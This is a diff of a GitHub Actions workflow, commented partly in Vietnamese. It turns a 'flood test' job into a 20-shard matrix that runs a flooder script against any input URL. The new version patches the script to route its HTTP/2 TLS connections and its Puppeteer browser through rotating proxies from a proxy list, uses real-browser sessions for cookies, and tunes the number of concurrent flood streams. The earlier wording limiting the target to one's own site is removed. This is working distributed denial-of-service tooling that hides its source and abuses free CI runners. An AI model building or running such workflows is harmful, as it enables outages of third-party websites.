@@ -1,81 +1,86 @@
-name: lab-flood-test
+name: 20 Shards Load Test (1.js with Proxy)
 
 on:
   workflow_dispatch:
     inputs:
-      target:
-        description: 'Target URL (website của bạn)'
+      url:
+        description: 'Target URL'
         required: true
         type: string
-      preset:
-        description: 'Preset chạy'
+      duration:
+        description: 'Duration (giây)'
         required: true
-        default: 'full20'
-        type: choice
-        options: [full20, custom]
-      time:
-        description: 'Thời gian (giây) — bỏ qua nếu preset=full20'
-        required: false
-        default: '60'
+        default: '600'
         type: string
-      rate:
-        description: 'Req/s/thread — bỏ qua nếu preset=full20'
-        required: false
-        default: '10'
+      rate_per_shard:
+        description: 'Rate per shard (req/s/flooder)'
+        required: true
+        default: '3'
         type: string
       threads:
-        description: 'Số worker — bỏ qua nếu preset=full20'
-        required: false
-        default: '20'
+        description: 'Cluster workers per shard'
+        required: true
+        default: '2'
         type: string
       cookie_count:
-        description: 'Số phiên browser — bỏ qua nếu preset=full20'
-        required: false
-        default: '2'
+        description: 'Số phiên browser / shard'
+        required: true
+        default: '1'
+        type: string
+      flooders:
+        description: 'MAX_CONCURRENT_STREAMS_PER_WORKER'
+        required: true
+        default: '10'
         type: string
 
 jobs:
-  flood:
+  build:
     runs-on: ubuntu-latest
-    timeout-minutes: 120              # đủ cho time lên tới ~120 phút
-    env:
-      NODE_OPTIONS: '--max-old-space-size=2048'
-
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-
-      - name: Setup Node.js
-        uses: actions/setup-node@v4
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
         with:
           node-version: '20'
-
-      - name: Verify Node.js and Script Syntax
+          
+      - name: Install dependencies
         run: |
-          echo "Node version: $(node -v)"
-          node --check 1.js || { echo "Syntax error in 1.js"; exit 1; }
+          npm init -y >/dev/null
+          # Dùng v5 để hàm connect() chạy đồng bộ (v7 dùng Promise sẽ lỗi tls.connect)
+          npm i puppeteer-real-browser https-proxy-agent@5
+          
+      - name: Package
+        run: tar czf bundle.tgz 1.js package*.json node_modules
+        
+      - uses: actions/upload-artifact@v4
+        with:
+          name: tool-bundle
+          path: bundle.tgz
 
-      - name: Resolve parameters
-        id: p
-        run: |
-          if [ "${{ inputs.preset }}" = "full20" ]; then
-            # Preset "full 20": 20 worker, 12 flooder/worker (240 socket) để không OOM
-            echo "TIME=120"    >> $GITHUB_OUTPUT
-            echo "RATE=10"     >> $GITHUB_OUTPUT
-            echo "THREADS=20"  >> $GITHUB_OUTPUT
-            echo "COOKIES=2"   >> $GITHUB_OUTPUT
-            echo "STREAMS=12"  >> $GITHUB_OUTPUT
-          else
-            echo "TIME=${{ inputs.time }}"            >> $GITHUB_OUTPUT
-            echo "RATE=${{ inputs.rate }}"            >> $GITHUB_OUTPUT
-            echo "THREADS=${{ inputs.threads }}"      >> $GITHUB_OUTPUT
-            echo "COOKIES=${{ inputs.cookie_count }}" >> $GITHUB_OUTPUT
-            echo "STREAMS=150"                         >> $GITHUB_OUTPUT
-          fi
-          echo "---- Resolved ----"
-          cat $GITHUB_OUTPUT
-
-      - name: Install system deps (Chrome + Xvfb + Fonts)
+  load:
+    needs: build
+    runs-on: ubuntu-latest
+    timeout-minutes: 90
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        shard: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+    env:
+      NODE_OPTIONS: '--max-old-space-size=2048'
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+          
+      - uses: actions/download-artifact@v4
+        with:
+          name: tool-bundle
+          
+      - name: Extract Bundle
+        run: tar xzf bundle.tgz && ls -la
+        
+      - name: Install Chrome + Xvfb + Deps
         run: |
           sudo apt-get update
           sudo apt-get install -y --no-install-recommends \
@@ -83,52 +88,102 @@ jobs:
             libgbm1 libasound2t64 libxss1 libxtst6 libx11-xcb1 \
             libxcb-dri3-0 libdrm2 fonts-liberation ca-certificates
           npx puppeteer browsers install chrome --install-deps
-
-      - name: Install npm deps
+          
+      - name: Split Proxy
+        env:
+          SHARD_ID: ${{ matrix.shard }}
         run: |
-          if [ -f package.json ]; then
-            npm install
+          if [ -f proxy.txt ]; then
+            awk -v s="$SHARD_ID" -v t="20" '((NR-1) % t) == (s-1)' proxy.txt > proxy_shard.txt
+            echo "Proxy lines: $(wc -l < proxy_shard.txt)"
           else
-            npm init -y >/dev/null
-            npm i puppeteer-real-browser
+            echo "Không tìm thấy proxy.txt, chạy direct không proxy"
+            touch proxy_shard.txt
           fi
 
-      - name: Raise fd limit
-        run: |
-          sudo bash -c 'echo "fs.file-max=200000" >> /etc/sysctl.conf'
-          echo "ulimit -n 65536" >> $GITHUB_ENV
-          ulimit -n
-
-      - name: Tune flooder count per worker
-        run: |
-          # Giảm MAX_CONCURRENT_STREAMS_PER_WORKER theo preset để tránh OOM
-          sed -i "s/const MAX_CONCURRENT_STREAMS_PER_WORKER = [0-9]*;/const MAX_CONCURRENT_STREAMS_PER_WORKER = ${{ steps.p.outputs.STREAMS }};/" 1.js
-          grep "MAX_CONCURRENT_STREAMS_PER_WORKER =" 1.js
-
-      - name: System sanity (mem/cpu/limits)
-        run: |
-          echo "nproc: $(nproc)"
-          free -h
-          ulimit -n
-
-      - name: Run flood (own asset)
+      - name: Patch 1.js (Inject Proxy & Tune Flooder)
         env:
-          TARGET:  ${{ inputs.target }}
-          TIME:    ${{ steps.p.outputs.TIME }}
-          RATE:    ${{ steps.p.outputs.RATE }}
-          THREADS: ${{ steps.p.outputs.THREADS }}
-          COOKIES: ${{ steps.p.outputs.COOKIES }}
+          FLOODERS: ${{ inputs.flooders }}
+        run: |
+          cat << 'EOF' > patch.js
+          const fs = require('fs');
+          let code = fs.readFileSync('1.js', 'utf8');
+
+          // 1. Inject thư viện proxy
+          if (!code.includes('HttpsProxyAgent')) {
+              code = "const { HttpsProxyAgent } = require('https-proxy-agent');\n" + code;
+          }
+
+          // 2. Vá cấu hình Puppeteer (thêm proxy-server)
+          code = code.replace(
+              "'--no-sandbox',",
+              "'--no-sandbox', ...(process.env.PROXY_URL ? ['--proxy-server=' + process.env.PROXY_URL] : []),"
+          );
+
+          // 3. Vá HTTP/2 TLS Socket (thêm HttpsProxyAgent)
+          const oldTLS = `function createTLSSocket(parsed) {
+            const tlsSocket = tls.connect({
+                host: parsed.hostname,`;
+          
+          const newTLS = `function createTLSSocket(parsed) {
+            let socket = undefined;
+            if (process.env.PROXY_URL) {
+                const agent = new HttpsProxyAgent(process.env.PROXY_URL);
+                socket = agent.connect({ host: parsed.hostname, port: 443 });
+            }
+            const tlsSocket = tls.connect({
+                socket: socket,
+                host: parsed.hostname,`;
+          
+          code = code.replace(oldTLS, newTLS);
+
+          // 4. Cập nhật số lượng flooder/worker
+          const flooders = process.env.FLOODERS || '10';
+          code = code.replace(
+              /const MAX_CONCURRENT_STREAMS_PER_WORKER = \d+;/,
+              `const MAX_CONCURRENT_STREAMS_PER_WORKER = ${flooders};`
+          );
+
+          fs.writeFileSync('1.js', code);
+          EOF
+          node patch.js
+          
+          # Kiểm tra xem patch đã ăn chưa
+          grep -E "MAX_CONCURRENT_STREAMS_PER_WORKER = |HttpsProxyAgent" 1.js
+
+      - name: Raise fd limit
+        run: echo "ulimit -n 65536" >> $GITHUB_ENV
+
+      - name: Run Tool (Shard ${{ matrix.shard }})
+        env:
+          TARGET:  ${{ inputs.url }}
+          DURATION: ${{ inputs.duration }}
+          RATE:    ${{ inputs.rate_per_shard }}
+          THREADS: ${{ inputs.threads }}
+          COOKIES: ${{ inputs.cookie_count }}
+          SHARD_ID: ${{ matrix.shard }}
         run: |
           ulimit -n 65536
-          echo "Running: target=$TARGET time=$TIME rate=$RATE threads=$THREADS cookies=$COOKIES"
+          DUR=${DURATION%s}
+          
+          # Lấy 1 proxy ngẫu nhiên từ file shard (nếu có)
+          PROXY_LINE=$(shuf -n 1 proxy_shard.txt || true)
+          if [ -n "$PROXY_LINE" ]; then
+            # Format lại proxy nếu cần (http://user:pass@ip:port)
+            export PROXY_URL="http://$PROXY_LINE"
+            echo "Shard $SHARD_ID using proxy: $PROXY_URL"
+          else
+            echo "Shard $SHARD_ID running without proxy"
+          fi
+          
+          echo "Running: $TARGET for ${DUR}s"
           xvfb-run -a --server-args="-screen 0 1920x1080x24" \
             node --max-old-space-size=2048 1.js \
-              "$TARGET" "$TIME" "$RATE" "$THREADS" "$COOKIES" \
-              2>&1 | tee run.log
+            "$TARGET" "$DUR" "$RATE" "$THREADS" "$COOKIES" \
+            2>&1 | tee output_shard_${SHARD_ID}.log
 
-      - name: Upload log
+      - uses: actions/upload-artifact@v4
         if: always()
-        uses: actions/upload-artifact@v4
         with:
-          name: flood-log
-          path: run.log
+          name: logs-shard-${{ matrix.shard }}
+          path: output_shard_${{ matrix.shard }}.log
